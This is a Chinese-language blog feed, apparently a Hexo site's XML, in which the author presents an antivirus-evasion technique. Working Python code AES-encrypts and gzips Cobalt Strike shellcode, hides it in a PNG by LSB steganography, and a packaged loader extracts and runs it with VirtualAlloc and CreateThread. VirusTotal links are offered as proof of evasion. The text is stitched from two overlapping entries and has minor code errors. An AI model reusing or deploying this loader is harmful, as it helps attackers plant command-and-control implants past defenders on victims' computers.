class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 压缩shellcode</span></span><br><span class="line">    gzip_shellcode = gzip.compress(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对明文进行 PKCS#7 填充</span></span><br><span class="line">    gzip_pad_shellcode = Padding.pad(gzip_shellcode, AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将字符串转为字节类型并填充至合适的长度</span></span><br><span class="line">    key = Padding.pad(key.encode(), AES.block_size)</span><br><span class="line">    iv = Padding.pad(iv.encode(), AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建 AES 加密器对象,使用CBC模式</span></span><br><span class="line">    aes_encrypt = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密压缩后的明文</span></span><br><span class="line">    ciphertext = aes_encrypt.encrypt(gzip_pad_shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入shellcode到文件中</span></span><br><span class="line">    output = payload+<span class="string">&quot;_aes&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        f.write(ciphertext)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write:&quot;</span>,output,<span class="string">&quot; ok&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LSB</span>(<span class="params">ciphertext,img</span>):</span></span><br><span class="line">    <span class="comment"># 压缩密文</span></span><br><span class="line">    gzip_compress = gzip.compress(ciphertext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The gzip_compress length is &quot;</span>,<span class="built_in">len</span>(gzip_compress))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取图片</span></span><br><span class="line">    im = cv2.imread(img)</span><br><span class="line">    steg = LSBSteg(im)</span><br><span class="line">    img_bin = steg.encode_binary(gzip_compress)</span><br><span class="line">    output = img.replace(<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;_LSB.png&quot;</span>)</span><br><span class="line">    cv2.imwrite(output,img_bin)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;write:&quot;</span>,output,<span class="string">&quot; ok&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;this_is_y&#x27;</span></span><br><span class="line">iv = <span class="string">&#x27;2317&#x27;</span></span><br><span class="line">payload = <span class="string">r&#x27;E:\4_Code\AST_bypass\demo2\code&#x27;</span></span><br><span class="line">img = <span class="string">r&quot;E:\4_Code\AST_bypass\demo2\1.png&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext = encrypt_shellcode(payload,key,iv)</span><br><span class="line">LSB(ciphertext,img)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20230613011933781.png" alt="image-20230613011933781"></p>
<p>图片对比，左边原图，右边隐写后的图。肉眼看基本没差别</p>
<p><img src="image-20230613012158390.png" alt="image-20230613012158390"></p>
<h1 id="运行代码"><a href="#运行代码" class="headerlink" title="运行代码"></a>运行代码</h1><p>负责运行的代码,这块代码需要打包成exe</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run.py</span></span><br><span class="line"><span class="keyword">from</span> cv2 <span class="keyword">import</span> imread</span><br><span class="line"><span class="keyword">from</span> gzip <span class="keyword">import</span> decompress</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> Padding</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SteganographyException</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LSBSteg</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, im</span>):</span></span><br><span class="line">        self.image = im</span><br><span class="line">        self.height, self.width, self.nbchannels = im.shape</span><br><span class="line">        self.size = self.width * self.height</span><br><span class="line">        </span><br><span class="line">        self.maskONEValues = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">128</span>]</span><br><span class="line">        <span class="comment">#Mask used to put one ex:1-&gt;00000001, 2-&gt;00000010 .. associated with OR bitwise</span></span><br><span class="line">        self.maskONE = self.maskONEValues.pop(<span class="number">0</span>) <span class="comment">#Will be used to do bitwise operations</span></span><br><span class="line">        </span><br><span class="line">        self.maskZEROValues = [<span class="number">254</span>,<span class="number">253</span>,<span class="number">251</span>,<span class="number">247</span>,<span class="number">239</span>,<span class="number">223</span>,<span class="number">191</span>,<span class="number">127</span>]</span><br><span class="line">        <span class="comment">#Mak used to put zero ex:254-&gt;11111110, 253-&gt;11111101 .. associated with AND bitwise</span></span><br><span class="line">        self.maskZERO = self.maskZEROValues.pop(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        self.curwidth = <span class="number">0</span>  <span class="comment"># Current width position</span></span><br><span class="line">        self.curheight = <span class="number">0</span> <span class="comment"># Current height position</span></span><br><span class="line">        self.curchan = <span class="number">0</span>   <span class="comment"># Current channel position</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_slot</span>(<span class="params">self</span>):</span><span class="comment">#Move to the next slot were information can be taken or put</span></span><br><span class="line">        <span class="keyword">if</span> self.curchan == self.nbchannels-<span class="number">1</span>: <span class="comment">#Next Space is the following channel</span></span><br><span class="line">            self.curchan = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> self.curwidth == self.width-<span class="number">1</span>: <span class="comment">#Or the first channel of the next pixel of the same line</span></span><br><span class="line">                self.curwidth = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> self.curheight == self.height-<span class="number">1</span>:<span class="comment">#Or the first channel of the first pixel of the next line</span></span><br><span class="line">                    self.curheight = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">if</span> self.maskONE == <span class="number">128</span>: <span class="comment">#Mask 1000000, so the last mask</span></span><br><span class="line">                        <span class="keyword">raise</span> SteganographyException(<span class="string">&quot;No available slot remaining (image filled)&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>: <span class="comment">#Or instead of using the first bit start using the second and so on..</span></span><br><span class="line">                        self.maskONE = self.maskONEValues.pop(<span class="number">0</span>)</span><br><span class="line">                        self.maskZERO = self.maskZEROValues.pop(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.curheight +=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.curwidth +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.curchan +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_bit</span>(<span class="params">self</span>):</span> <span class="comment">#Read a single bit int the image</span></span><br><span class="line">        val = self.image[self.curheight,self.curwidth][self.curchan]</span><br><span class="line">        val = <span class="built_in">int</span>(val) &amp; self.maskONE</span><br><span class="line">        self.next_slot()</span><br><span class="line">        <span class="keyword">if</span> val &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_byte</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.read_bits(<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_bits</span>(<span class="params">self, nb</span>):</span> <span class="comment">#Read the given number of bits</span></span><br><span class="line">        bits = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nb):</span><br><span class="line">            bits += self.read_bit()</span><br><span class="line">        <span class="keyword">return</span> bits</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_binary</span>(<span class="params">self</span>):</span></span><br><span class="line">        l = <span class="built_in">int</span>(self.read_bits(<span class="number">64</span>), <span class="number">2</span>)</span><br><span class="line">        output = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">            output += <span class="built_in">bytearray</span>([<span class="built_in">int</span>(self.read_byte(),<span class="number">2</span>)])</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_shellcode</span>(<span class="params">ciphertext,key,iv</span>):</span></span><br><span class="line">    <span class="comment"># 读取加密后的shellcode</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># with open(&quot;aes_payload&quot;,&#x27;rb&#x27;)as f:</span></span><br><span class="line">    <span class="comment">#     ciphertext = f.read()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置key和iv</span></span><br><span class="line">    <span class="comment"># key = &#x27;this_is_y&#x27;</span></span><br><span class="line">    <span class="comment"># iv = &#x27;2317&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将字符串转为字节类型并填充至合适的长度</span></span><br><span class="line">    key = Padding.pad(key.encode(), AES.block_size)</span><br><span class="line">    iv = Padding.pad(iv.encode(), AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建 AES 加密器对象,使用CBC模式</span></span><br><span class="line">    aes_decrypt = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密压缩后的明文</span></span><br><span class="line">    plaintext = aes_decrypt.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对解密后的填充数据进行 PKCS#7 反填充</span></span><br><span class="line">    plaintext = Padding.unpad(plaintext, AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解压明文</span></span><br><span class="line">    shellcode = decompress(plaintext)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># with open(&quot;code_decrypt&quot;,&#x27;wb&#x27;)as f:</span></span><br><span class="line">    <span class="comment">#     f.write(shellcode)</span></span><br><span class="line">    <span class="keyword">return</span> shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) != <span class="number">4</span>:</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = argv[<span class="number">1</span>]</span><br><span class="line">key = argv[<span class="number">2</span>]</span><br><span class="line">iv = argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">im_bin = imread(payload)</span><br><span class="line">steg = LSBSteg(im_bin)</span><br><span class="line"><span class="built_in">bin</span> = steg.decode_binary()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取到代码，解密出来，使用ast运行</span></span><br><span class="line"></span><br><span class="line">data = gzip.decompress(<span class="built_in">bin</span>)</span><br><span class="line">code = decrypt_shellcode(data,key,iv)</span><br><span class="line">run_code = <span class="built_in">compile</span>(code,<span class="string">&#x27;&lt;string&gt;&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(run_code)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>pyinstaller -F -w .\run.py</li>
<li>run.exe 图片路径 key iv</li>
</ul>
<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="image-20230613014603964.png" alt="image-20230613014603964"></p>
<p><a class="link" href="https://www.virustotal.com/gui/file/e9fa4eba8cf713d7e7a2195f83523b173aa7a050952f92561d6989c55320601c?nocache=1">https://www.virustotal.com/gui/file/e9fa4eba8cf713d7e7a2195f83523b173aa7a050952f92561d6989c55320601c?nocache=1<i class="fas fa-external-link-alt"></i></a><br><img src="image-20230613014614732.png" alt="image-20230613014614732"></p>
<p><a class="link" href="https://www.virustotal.com/gui/file/9ef00644d18c3fb23148c2382cea47dba25ff4029e33025d35e660e1e1096473?nocache=1">https://www.virustotal.com/gui/file/9ef00644d18c3fb23148c2382cea47dba25ff4029e33025d35e660e1e1096473?nocache=1<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20230613014906753.png" alt="image-20230613014906753"></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>最后有一个相对蛋疼的事情。打包出来的居然有50MB。</p>
<p>我突然就想到了当初为什么不用python做免杀了</p>
]]></content>
  </entry>
  <entry>
    <title>记录一个免杀思路</title>
    <url>/2023/06/13/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF(%E5%B9%B6%E4%B8%8D%E6%96%B0/</url>
    <content><![CDATA[<h1 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h1><p>AST抽象语法树+图片隐写</p>
<p>思路以及部分代码来源<br><a class="link" href="https://github.com/RobinDavid/LSB-Steganography">https://github.com/RobinDavid/LSB-Steganography<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://unsafe.sh/go-167427.html">https://unsafe.sh/go-167427.html<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>选择的是CS4.7 的python shellcode，忘了是32还是64了，<del>无关紧要</del>。</p>
<h1 id="执行代码模板"><a href="#执行代码模板" class="headerlink" title="执行代码模板"></a>执行代码模板</h1><p>手动把生成的shellcode替换到buf参数中，前面的 <strong>b</strong> 不要删了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># code</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_int,c_uint64,windll,c_char,pointer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">py3loader2</span>(<span class="params">para</span>):</span></span><br><span class="line">        para = <span class="built_in">bytearray</span>(para)</span><br><span class="line">        windll.kernel32.VirtualAlloc.restype = c_uint64</span><br><span class="line">        ptr = windll.kernel32.VirtualAlloc(</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="built_in">len</span>(para)),</span><br><span class="line">                c_int(<span class="number">0x3000</span>),</span><br><span class="line">                c_int(<span class="number">0x40</span>)</span><br><span class="line">        )</span><br><span class="line">        buf = (c_char * <span class="built_in">len</span>(para)).from_buffer(para)</span><br><span class="line">        windll.kernel32.RtlMoveMemory(</span><br><span class="line">                c_uint64(ptr),</span><br><span class="line">                buf,</span><br><span class="line">                c_int(<span class="built_in">len</span>(para))</span><br><span class="line">        )</span><br><span class="line">        handle = windll.kernel32.CreateThread(</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_uint64(ptr),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                pointer(c_int(<span class="number">0</span>))</span><br><span class="line">        )</span><br><span class="line">        windll.kernel32.WaitForSingleObject(</span><br><span class="line">                c_int(handle),</span><br><span class="line">                c_int(-<span class="number">1</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&#x27;\x4d\x5a\x41\x52\x55\x48\x89\xe5\x48\x81\xec\x20\x00\x00\x00\x48\x8d\x1d\xea\xff\xff\xff\x48\x89\xdf\x48\x81\xc3\x3c\x6e\x01\x00\xff\xd3\x41\xb8\xf0\xb5\xa2\x56\x68\x04\x00\x00\x00\x5a\x48\x89\xf9\xff\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x01\x00\x00\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21\x54\x68\x69\x73\x20\x70\x72\x6f\x67\x72\x61\x6d\x20\x63\x61\x6e\x6e\x6f\x74\x20\x62\x65\x20\x72\x75\x6e\x20\x69\x6e\x20\x44\x4f\x53\x20\x6d\x6f\x64\x65\x2e\x0d\x0d\x0a\x24\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">py3loader2(buf)</span><br></pre></td></tr></table></figure>



<h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><p>负责生成隐写的图片和aes加密后的代码（这部分没什么用）。被隐写的图片只能用png类型，而且还不能太小，需要有一定的冗余空间。几kb那种肯定不行的，具体多少我也没测试，随手截了一张壁纸。</p>
<p>其中用到了aes加密，需要自己设置好key和iv，启动的时候需要用的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># generate.py</span></span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> Padding</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> docopt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SteganographyException</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LSBSteg</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, im</span>):</span></span><br><span class="line">        self.image = im</span><br><span class="line">        self.height, self.width, self.nbchannels = im.shape</span><br><span class="line">        self.size = self.width * self.height</span><br><span class="line">        </span><br><span class="line">        self.maskONEValues = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">128</span>]</span><br><span class="line">        <span class="comment">#Mask used to put one ex:1-&gt;00000001, 2-&gt;00000010 .. associated with OR bitwise</span></span><br><span class="line">        self.maskONE = self.maskONEValues.pop(<span class="number">0</span>) <span class="comment">#Will be used to do bitwise operations</span></span><br><span class="line">        </span><br><span class="line">        self.maskZEROValues = [<span class="number">254</span>,<span class="number">253</span>,<span class="number">251</span>,<span class="number">247</span>,<span class="number">239</span>,<span class="number">223</span>,<span class="number">191</span>,<span class="number">127</span>]</span><br><span class="line">        <span class="comment">#Mak used to put zero ex:254-&gt;11111110, 253-&gt;11111101 .. associated with AND bitwise</span></span><br><span class="line">        self.maskZERO = self.maskZEROValues.pop(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        self.curwidth = <span class="number">0</span>  <span class="comment"># Current width position</span></span><br><span class="line">        self.curheight = <span class="number">0</span> <span class="comment"># Current height position</span></span><br><span class="line">        self.curchan = <span class="number">0</span>   <span class="comment"># Current channel position</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put_binary_value</span>(<span class="params">self, bits</span>):</span> <span class="comment">#Put the bits in the image</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> bits:</span><br><span class="line">            val = <span class="built_in">list</span>(self.image[self.curheight,self.curwidth]) <span class="comment">#Get the pixel value as a list</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(c) == <span class="number">1</span>:</span><br><span class="line">                val[self.curchan] = <span class="built_in">int</span>(val[self.curchan]) | self.maskONE <span class="comment">#OR with maskONE</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                val[self.curchan] = <span class="built_in">int</span>(val[self.curchan]) &amp; self.maskZERO <span class="comment">#AND with maskZERO</span></span><br><span class="line">                </span><br><span class="line">            self.image[self.curheight,self.curwidth] = <span class="built_in">tuple</span>(val)</span><br><span class="line">            self.next_slot() <span class="comment">#Move &quot;cursor&quot; to the next space</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_slot</span>(<span class="params">self</span>):</span><span class="comment">#Move to the next slot were information can be taken or put</span></span><br><span class="line">        <span class="keyword">if</span> self.curchan == self.nbchannels-<span class="number">1</span>: <span class="comment">#Next Space is the following channel</span></span><br><span class="line">            self.curchan = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> self.curwidth == self.width-<span class="number">1</span>: <span class="comment">#Or the first channel of the next pixel of the same line</span></span><br><span class="line">                self.curwidth = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> self.curheight == self.height-<span class="number">1</span>:<span class="comment">#Or the first channel of the first pixel of the next line</span></span><br><span class="line">                    self.curheight = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">if</span> self.maskONE == <span class="number">128</span>: <span class="comment">#Mask 1000000, so the last mask</span></span><br><span class="line">                        <span class="keyword">raise</span> SteganographyException(<span class="string">&quot;No available slot remaining (image filled)&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>: <span class="comment">#Or instead of using the first bit start using the second and so on..</span></span><br><span class="line">                        self.maskONE = self.maskONEValues.pop(<span class="number">0</span>)</span><br><span class="line">                        self.maskZERO = self.maskZEROValues.pop(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.curheight +=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.curwidth +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.curchan +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_bit</span>(<span class="params">self</span>):</span> <span class="comment">#Read a single bit int the image</span></span><br><span class="line">        val = self.image[self.curheight,self.curwidth][self.curchan]</span><br><span class="line">        val = <span class="built_in">int</span>(val) &amp; self.maskONE</span><br><span class="line">        self.next_slot()</span><br><span class="line">        <span class="keyword">if</span> val &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_byte</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.read_bits(<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_bits</span>(<span class="params">self, nb</span>):</span> <span class="comment">#Read the given number of bits</span></span><br><span class="line">        bits = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nb):</span><br><span class="line">            bits += self.read_bit()</span><br><span class="line">        <span class="keyword">return</span> bits</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">byteValue</span>(<span class="params">self, val</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.binary_value(val, <span class="number">8</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">binary_value</span>(<span class="params">self, val, bitsize</span>):</span> <span class="comment">#Return the binary value of an int as a byte</span></span><br><span class="line">        binval = <span class="built_in">bin</span>(val)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(binval) &gt; bitsize:</span><br><span class="line">            <span class="keyword">raise</span> SteganographyException(<span class="string">&quot;binary value larger than the expected size&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(binval) &lt; bitsize:</span><br><span class="line">            binval = <span class="string">&quot;0&quot;</span>+binval</span><br><span class="line">        <span class="keyword">return</span> binval</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode_text</span>(<span class="params">self, txt</span>):</span></span><br><span class="line">        l = <span class="built_in">len</span>(txt)</span><br><span class="line">        binl = self.binary_value(l, <span class="number">16</span>) <span class="comment">#Length coded on 2 bytes so the text size can be up to 65536 bytes long</span></span><br><span class="line">        self.put_binary_value(binl) <span class="comment">#Put text length coded on 4 bytes</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> txt: <span class="comment">#And put all the chars</span></span><br><span class="line">            c = <span class="built_in">ord</span>(char)</span><br><span class="line">            self.put_binary_value(self.byteValue(c))</span><br><span class="line">        <span class="keyword">return</span> self.image</span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_text</span>(<span class="params">self</span>):</span></span><br><span class="line">        ls = self.read_bits(<span class="number">16</span>) <span class="comment">#Read the text size in bytes</span></span><br><span class="line">        l = <span class="built_in">int</span>(ls,<span class="number">2</span>)</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        unhideTxt = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; l: <span class="comment">#Read all bytes of the text</span></span><br><span class="line">            tmp = self.read_byte() <span class="comment">#So one byte</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            unhideTxt += <span class="built_in">chr</span>(<span class="built_in">int</span>(tmp,<span class="number">2</span>)) <span class="comment">#Every chars concatenated to str</span></span><br><span class="line">        <span class="keyword">return</span> unhideTxt</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode_image</span>(<span class="params">self, imtohide</span>):</span></span><br><span class="line">        w = imtohide.width</span><br><span class="line">        h = imtohide.height</span><br><span class="line">        <span class="keyword">if</span> self.width*self.height*self.nbchannels &lt; w*h*imtohide.channels:</span><br><span class="line">            <span class="keyword">raise</span> SteganographyException(<span class="string">&quot;Carrier image not big enough to hold all the datas to steganography&quot;</span>)</span><br><span class="line">        binw = self.binary_value(w, <span class="number">16</span>) <span class="comment">#Width coded on to byte so width up to 65536</span></span><br><span class="line">        binh = self.binary_value(h, <span class="number">16</span>)</span><br><span class="line">        self.put_binary_value(binw) <span class="comment">#Put width</span></span><br><span class="line">        self.put_binary_value(binh) <span class="comment">#Put height</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(imtohide.height): <span class="comment">#Iterate the hole image to put every pixel values</span></span><br><span class="line">            <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(imtohide.width):</span><br><span class="line">                <span class="keyword">for</span> chan <span class="keyword">in</span> <span class="built_in">range</span>(imtohide.channels):</span><br><span class="line">                    val = imtohide[h,w][chan]</span><br><span class="line">                    self.put_binary_value(self.byteValue(<span class="built_in">int</span>(val)))</span><br><span class="line">        <span class="keyword">return</span> self.image</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_image</span>(<span class="params">self</span>):</span></span><br><span class="line">        width = <span class="built_in">int</span>(self.read_bits(<span class="number">16</span>),<span class="number">2</span>) <span class="comment">#Read 16bits and convert it in int</span></span><br><span class="line">        height = <span class="built_in">int</span>(self.read_bits(<span class="number">16</span>),<span class="number">2</span>)</span><br><span class="line">        unhideimg = np.zeros((width,height, <span class="number">3</span>), np.uint8) <span class="comment">#Create an image in which we will put all the pixels read</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">                <span class="keyword">for</span> chan <span class="keyword">in</span> <span class="built_in">range</span>(unhideimg.channels):</span><br><span class="line">                    val = <span class="built_in">list</span>(unhideimg[h,w])</span><br><span class="line">                    val[chan] = <span class="built_in">int</span>(self.read_byte(),<span class="number">2</span>) <span class="comment">#Read the value</span></span><br><span class="line">                    unhideimg[h,w] = <span class="built_in">tuple</span>(val)</span><br><span class="line">        <span class="keyword">return</span> unhideimg</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode_binary</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        l = <span class="built_in">len</span>(data)</span><br><span class="line">        <span class="keyword">if</span> self.width*self.height*self.nbchannels &lt; l+<span class="number">64</span>:</span><br><span class="line">            <span class="keyword">raise</span> SteganographyException(<span class="string">&quot;Carrier image not big enough to hold all the datas to steganography&quot;</span>)</span><br><span class="line">        self.put_binary_value(self.binary_value(l, <span class="number">64</span>))</span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">            byte = byte <span class="keyword">if</span> <span class="built_in">isinstance</span>(byte, <span class="built_in">int</span>) <span class="keyword">else</span> <span class="built_in">ord</span>(byte) <span class="comment"># Compat py2/py3</span></span><br><span class="line">            self.put_binary_value(self.byteValue(byte))</span><br><span class="line">        <span class="keyword">return</span> self.image</span><br><span 